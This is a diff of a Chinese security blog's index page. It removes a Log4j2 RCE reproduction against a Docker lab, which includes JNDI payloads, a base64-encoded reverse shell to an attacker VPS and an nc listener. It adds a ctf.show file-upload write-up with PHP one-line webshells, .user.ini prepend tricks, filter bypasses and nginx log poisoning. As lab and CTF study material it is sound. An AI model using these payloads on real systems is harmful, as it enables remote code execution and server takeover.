@@ -200,111 +200,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">log4j2复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-24 18:32:39" itemprop="dateCreated datePublished" datetime="2022-04-24T18:32:39+08:00">2022-04-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-22 10:05:04" itemprop="dateModified" datetime="2022-07-22T10:05:04+08:00">2022-07-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43795682/article/details/123557217">https://blog.csdn.net/weixin_43795682/article/details/123557217</a></p>
-<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>docker pull vulfocus&#x2F;log4j2-rce-2021-12-09:latest	&#x2F;&#x2F;docker拉漏洞环境</p>
-<p>docker run -p  8080:8080 -d –name log4j2-rce  vulfocus&#x2F;log4j2-rce-2021-12-09	&#x2F;&#x2F;运行环境，映射到主机8080端口</p>
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;jndi:ldap://wdhcrj.dnslog.cn/exp&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%83release%E4%B8%AD%E7%9A%84%E7%8E%B0%E6%88%90jar%EF%BC%8C%E5%BD%93%E7%84%B6%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E4%B9%9F%E5%8F%AF%E4%BB%A5%E3%80%82">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md工具，下载它release中的现成jar，当然自己编译也可以。</a></p>
-<p>把JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar拖到VPS，使用以下命令，构建JNDI环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-
-<p>其中YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE&#x3D;是base64加密后的反弹shell命令，解密为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/432 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-
-<p>以上命令的功能是反弹一个shell到VPS的432端口。</p>
-<p>由于JNDI环境需要用到8180、1099、1389这3个端口，所以要确保VPS上这3个端口未被占用，并且在云防火墙上开放这3个端口限制。</p>
-<p>JNDI命令执行后，效果如下：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424195833352.png" alt="image-20220424195833352"></p>
-<p>最后，VPS上监听432端口。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 432</span><br></pre></td></tr></table></figure>
-
-<p>使用上图中只有一行的链接，代入如下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:rmi://xxx.xxx.xxx.xxx:1099/jdulim&#125;</span><br></pre></td></tr></table></figure>
-
-<p>有时注入点在get参数上，就需要把整个payloadURL编码，如下：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424200438345.png" alt="image-20220424200438345"></p>
-<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><p>使用burp插件</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a></p>
-<p>下载jar包后，导入到burpsuite扩展中，配置任意dnslog平台的api和token即可，其他保持默认</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207221004703.png" alt="image-20220722100448161"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/15/Shuize%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1100,6 +995,135 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/14/WEB%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/14/WEB%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">WEB入门_文件上传</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-14 11:53:57" itemprop="dateCreated datePublished" datetime="2022-02-14T11:53:57+08:00">2022-02-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-CTF/" itemprop="url" rel="index"><span itemprop="name">1.CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-CTF/1-ctf-show/" itemprop="url" rel="index"><span itemprop="name">1.ctf.show</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="web151JS校验"><a href="#web151JS校验" class="headerlink" title="web151	JS校验"></a>web151	JS校验</h4><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>先上传png图片马，抓包改后缀为php。</p>
+<h4 id="web152mime-type校验"><a href="#web152mime-type校验" class="headerlink" title="web152	mime-type校验"></a>web152	mime-type校验</h4><h5 id="解题1-1"><a href="#解题1-1" class="headerlink" title="解题1"></a>解题1</h5><p>先上传png图片马，抓包改后缀为php。</p>
+<h4 id="web153-user-ini绕过"><a href="#web153-user-ini绕过" class="headerlink" title="web153 .user.ini绕过"></a>web153 .user.ini绕过</h4><h5 id="解题1-2"><a href="#解题1-2" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
+
+<p>上传shell.png图片马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="web154-短标签绕过"><a href="#web154-短标签绕过" class="headerlink" title="web154 短标签绕过"></a>web154 短标签绕过</h4><h5 id="解题1-3"><a href="#解题1-3" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
+
+<p>上传shell.png图片马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST[1])?&gt;	//&lt;?php&gt;代替为&lt;?= ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如上，增加了对文件内容的校验，php关键字被过滤了。所以使用短标签绕过。</p>
+<p>其余短标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? ?&gt;	//windows默认开启，Linux中需要配置</span><br><span class="line">&lt;% %&gt;	//需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。</span><br></pre></td></tr></table></figure>
+
+<p>其他方法实现php标签功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=”php”&gt; &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="web155-短标签绕过"><a href="#web155-短标签绕过" class="headerlink" title="web155 短标签绕过"></a>web155 短标签绕过</h4><h5 id="解题1-4"><a href="#解题1-4" class="headerlink" title="解题1"></a>解题1</h5><p>与上一题思路一致。</p>
+<h4 id="web156-花括号绕过"><a href="#web156-花括号绕过" class="headerlink" title="web156 花括号绕过"></a>web156 花括号绕过</h4><h5 id="解题1-5"><a href="#解题1-5" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
+
+<p>上传shell.png图片马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;)?&gt;	//中括号被过滤了，替换为花括号</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="web157-反引号绕过"><a href="#web157-反引号绕过" class="headerlink" title="web157 反引号绕过"></a>web157 反引号绕过</h4><h5 id="解题1-6"><a href="#解题1-6" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
+
+<p>上传shell.png：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;	//[]、&#123;&#125;、system()等全被过滤了，&lt;?=``?&gt;的格式，直接命令执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="web158-反引号绕过"><a href="#web158-反引号绕过" class="headerlink" title="web158  反引号绕过"></a>web158  反引号绕过</h4><p>和上一题一样。</p>
+<h4 id="web159-反引号绕过"><a href="#web159-反引号绕过" class="headerlink" title="web159 反引号绕过"></a>web159 反引号绕过</h4><p>和上一题一样</p>
+<h4 id="web160-包含日志文件"><a href="#web160-包含日志文件" class="headerlink" title="web160 包含日志文件"></a>web160 包含日志文件</h4><h5 id="解题1-7"><a href="#解题1-7" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
+
+<p>上传shell.png：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;	//[]、&#123;&#125;、system()、反引号、log等全被过滤了</span><br></pre></td></tr></table></figure>
+
+<p>然后再请求头User-Agent字段写上一句话，这样一句话会被记录到nginx日志中：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，而这个文件会被shell.png中的代码包含，导致我们访问&#x2F;upload&#x2F;index.php的时候，日志会被包含，一句话木马也同时会被包含。</p>
+<h4 id="web161-幻术文件头"><a href="#web161-幻术文件头" class="headerlink" title="web161 幻术文件头"></a>web161 幻术文件头</h4><p>幻术文件头，加一个GIF89a，其他和上题一样</p>
+<h4 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h4>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -1171,7 +1195,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1215,7 +1239,7 @@
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共41k字</span>
+  <span class="post-count">博客全站共36.8k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
